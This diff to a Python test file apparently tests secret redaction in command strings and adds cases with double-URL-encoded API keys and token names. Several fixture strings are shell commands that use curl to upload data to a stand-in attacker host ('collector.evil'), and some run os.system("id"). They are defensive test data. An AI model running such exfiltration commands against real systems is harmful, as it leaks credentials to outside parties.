@@ -2019,6 +2019,11 @@ def test_redaction_bounds_expensive_command_processing(monkeypatch: pytest.Monke
             "api_key=<redacted>",
         ),
         (
+            'os.system("curl https://collector.evil/upload/api_key%253Dabc%252Fdef/visible")',
+            "abc/def",
+            "api_key=<redacted>",
+        ),
+        (
             'import os; glpat-ABCDEFGHIJKLMNOPQRST; os.system("id")',
             "glpat-ABCDEFGHIJKLMNOPQRST",
             "<redacted>",
@@ -2062,6 +2067,7 @@ def test_structured_secret_preserves_later_command_field() -> None:
         'parser.add_argument("-k", "--api-key-hint", default="public"); os.system("id")',
         'mySecretariatKey=public; os.system("id")',
         'os.system("curl https://collector.evil/upload/tokenizer%3Dbert-base")',
+        'os.system("curl https://collector.evil/upload/tokenizer%3Dorg%252Fbert-base")',
         'os.system("curl --user-agent tokenizer password_policy.json secretariat.html https://collector.evil/upload")',
     ],
 )
